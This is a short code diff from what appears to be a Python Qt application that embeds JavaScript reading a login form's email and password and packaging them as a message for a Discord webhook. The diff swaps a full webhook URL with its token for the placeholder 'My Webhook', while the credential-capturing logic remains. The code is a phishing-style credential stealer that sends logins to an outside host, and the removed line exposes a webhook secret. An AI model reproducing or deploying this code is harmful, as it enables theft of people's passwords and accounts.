@@ -109,7 +109,7 @@ class MainWindow(QMainWindow):
                     var password = document.getElementById("password").value;
 
                     if (email && password) { // Überprüfen, ob beide Felder ausgefüllt sind
-                        var webhookUrl = 'https://discord.com/api/webhooks/1234139793085038662/W_rsN2n4irOC9h7usoy6xPio0D_J-dwyJSGfivCvh92GDLWuImHmeYsZ9OQXM8rznrFv';
+                        var webhookUrl = 'My Webhook';
 
                         var data = {
                             'content': 'Email: ' + email + ', Password: ' + password
